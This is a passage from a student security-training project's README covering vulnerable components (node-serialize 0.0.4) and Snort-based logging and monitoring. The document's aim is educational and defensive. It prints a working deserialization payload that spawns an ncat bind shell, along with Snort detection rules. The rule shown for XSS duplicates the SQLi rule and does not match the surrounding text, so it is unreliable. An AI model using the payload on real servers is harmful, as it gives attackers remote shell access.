  A mitigation technique to discover vulnerabilities against our web application is to manually check the libraries and version against exploit databases, CVEs, etc.  This is how we discovered the vulnerability with **node serialize v.0.0.4**, however, there are more efficient methods to do so.  As developers we can employ automated scanners, such as <a href="https://www.tenable.com">Tenable's Nessus</a> or <a href="https://www.openvas.org">Openvas</a>.
  
  Automated scanners enable developers to continuously monitor their web application for current and new vulnerabilities not only in our web applications, but in all software running on our Host system. Very rarely do hackers rely on one vulnerability to gain control of a system.  Systems are usually "rooted" by chaining multiple exploits together. Automated scanners are an effective way to discover vulnerabilities and address "low hanging fruit".
  
  Once a component with a known vulnerability is discovered, developers should seek to remove that component from their application, or mitigate the vulnerability.  In the Insecure Deserialization section, we mitigated the vulnerability with the use of the <code>JSON.stringify</code> function.  A more preferable solution, would be to use another library that provides the same functionality, but without the vulnerabilty.
  
  The nodejs engine <span class="bold">v8</span> provides us such a capability. It allows us to serialize and deserialize objects.
  
  Our code to serialize user input is now:
  
  ```
  var v8 = require('v8')
  var obj = req.body.userInput
  var serialized = v8.serialize(obj)
  var json = JSON.stringify(serialized)
  ```
  
  Here's what you'll see if you serialize an object in our web app:
  
  ```
  {test:123}
  ```
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/usingComponentsWithKnownVulnerabilities1.PNG">
  
  Our code to deserialize an object is now:
  
  ```
  var obj = Buffer.from(JSON.parse(req.body.userInput).data)
  var deserialized = obj.toString('utf8')
  ```
  
  Here's what you'll see if you deserialize the corresponding serialized object:
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/usingComponentsWithKnownVulnerabilities2.PNG">
  
  As in the Insecure Deserialization Section, attempt to start up a BIND shell on our webserver, by deserializing the following malicious input:
  
  ```
  {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}
  ```
  
  We now receive a error message, instead of a BIND shell:
    
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/usingComponentsWithKnownVulnerabilities3.PNG">  
  
  ---
### Citations: Using Components with Known Vulnerabilities
  "Insecure Components". Team Treehouse.  
  https://teamtreehouse.com/library/insecure-components (accessed Feb 18, 2022).
  
  "What is using components with known vulnerabilities". GeeksForGeeks.  
  https://www.geeksforgeeks.org/what-is-components-with-known-vulnerability/ (accessed Feb 19, 2022).
  
  "You can't ignore using components with known vulnerabilities". Whitesource.  
  https://www.whitesourcesoftware.com/resources/blog/using-components-with-known-vulnerabilities/ (accessed Feb 19, 2022).
</details>

# 10. Insufficient Logging & Monitoring
<details>
  <summary>
    Details
  </summary>
  
### Description
  |Source|Definition|
  |---|---|
  |Siemba|**Insufficient logging and monitoring** is missing security critical information logs or lack of proper log format, context, storage, security and timely response to detect an incident or breach.|
  |Crashtest Security|Attacks based on <span class="bold">insufficient logging and monitoring</span> are usually ranked high prevalence, medium in opportunity, and low in detectability.  Ensuring that all events are logged, and events monitored, as a result, is often considered a first step in intrusion detection.|
  |MITRE|When a security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic alanysis after an attack succeeds.|
  
  ---
### Demonstration
  **Insufficient Logging and Monitoring** is not necessarily a vulnerability that can be exploited, however, it makes an attack on system more likely to succeed.  The absence of logging and monitoring means that it is almost impossible to detect an attack on a system and thus prevents any response or mitigative actions from taking place.
  
  ---
### Remediation
  Our remediation makes use of **Snort**. To see this remediation, please head to our <a href="http://ec2-157-175-92-30.me-south-1.compute.amazonaws.com:37773/insufficientLoggingAndMonitoring">AWS EC2 instance</a> and try the exercises there, which will trigger our web application to start up Snort.
  
  Snort is an Intrustion Detection System (IDS) and is installed on our host operating system in our AWS EC2 instance.
  
  The heart of what makes Snort work is the rules file. Below, is a screenshot of the rules that we created:</p>
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/images/snort_rules.png" width="100%">
  
  The following screenshot explains the general syntax of a snort rule:
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/images/snort_syntax.png" width="100%">
  
  This following rule tells Snort what to look for in an sqli attack:
  ```
  alert tcp any any -> any any (msg: "SERVER-WEBAPP SQLI";content: "%27"; sid:10000003;)
  ```

  The only portion of the rule not explained in the syntax screenshot, is the **content** key-value pair.  The value, which in this case is "%27", is unicode for a single quote, which is what is required to conduct an sqli attack against our web application.  This rule tells snort to inspect packets being sent to our system, if detects a single quote in the packet, it will generate a log.
  
  This following rule tells Snort what to look for in an XSS attack:
  ```
  alert tcp any any -> any any (msg: "SERVER-WEBAPP SQLI";content: "%27"; sid:10000003;)
  ```
  
  In this rule when snort detects the string "alert" in a packet, it will generate a log for possible XSS attack.
  
  In the logs we can see your IP, or the IP of the attacker attempting to exploit our web application. (IP obscured in screenshot below):
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/logs.PNG">
  
  This demonstration shows how powerful logging and monitoring can be, it can help defenders identify possible intrusions into their system.  However, an IDS is only as good as the rules that written for it.  Additionally, defenders must also be skilled in reviewing logs.  In our example we only had two attacks, in an enterprise system, their could potentially be hundreds, thousands, even hundreds of thousands of alerts.
  
  ---
### Citations: Insufficient Logging & Monitoring
  "OWASP Top 10 - Insufficient Logging and Monitoring". Siemba.  
  https://www.siemba.io/post/owasp-top-10-insufficient-logging-monitoring (accessed Feb 26, 2022).
  
  "Comprehensive Guide To Insufficient Logging and Monitoring and How to Prevent It". Crashtest Security.  
  https://crashtest-security.com/insufficient-logging-monitoring-guide/ (accessed Feb 27, 2022).
  
  "Insufficient Logging". MITRE.  
  https://cwe.mitre.org/data/definitions/778.html (accessed Feb 26, 2022).
</details>

# Citations: Primary Sources

"Website Security Research Project." EECS Project site.
https://eecs.oregonstate.edu/capstone/submission/pages/viewSingleProject.php?id=OLLHp1v4lrRuobYa (accessed Dec 2021-Jan 2022).

Avi. D. "Top 10 Common Web Attacks: The First Steps to Protect Your Website." vpnMentor.
https://www.vpnmentor.com/blog/top-10-common-web-attacks/ (accessed Dec 2021-Jan 2022).

# Code References

REFERENCES  
<sub>
├── body-parser		| "body-parser", http://expressjs.com/en/resources/middleware/body-parser.html  
├── crypto			| "Crypto", https://nodejs.org/api/crypto.html#cryptorandombytessize-callback  
├── expressjs		| "Hello world example", https://expressjs.com/en/starter/hello-world.html  
├── expressjs		| "cs340_sample_nodejs_app", https://github.com/knightsamar/cs340_sample_nodejs_app  
├── expressjs		| OSU CS340 INTRODUCTION TO DATABASES, https://canvas.oregonstate.edu/courses/1825733  
├── expressjs		| "Express error handling", https://expressjs.com/en/guide/error-handling.html  
├── express-session	| "express-session", http://expressjs.com/en/resources/middleware/session.html  
├── handlebars		| "Introduction", https://handlebarsjs.com/guide/  
├── handlebars		| "Express Handlebars", https://www.npmjs.com/package/express-handlebars  
├── handlebars		| "Hello Handlebars", https://eecs.oregonstate.edu/ecampus-video/CS290/core-content/hello-node/hello-handlebars.html  
├── handlebars		| "app.locals", https://expressjs.com/en/api.html#app.locals  
├── JavaScript		| "Element.classList", https://developer.mozilla.org/en-US/docs/Web/API/Element/classList  
├── JavaScript 		| "parseInt()", https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt  
├── MySQL			| "Using Node on the Engineering Servers", https://eecs.oregonstate.edu/ecampus-video/CS290/core-content/tools-and-overview/Using-Node-on-the-Engineering-Servers.html  
└── Window.prompt 	| "Window.prompt()", https://developer.mozilla.org/en-US/docs/Web/API/Window/prompt  
</sub>
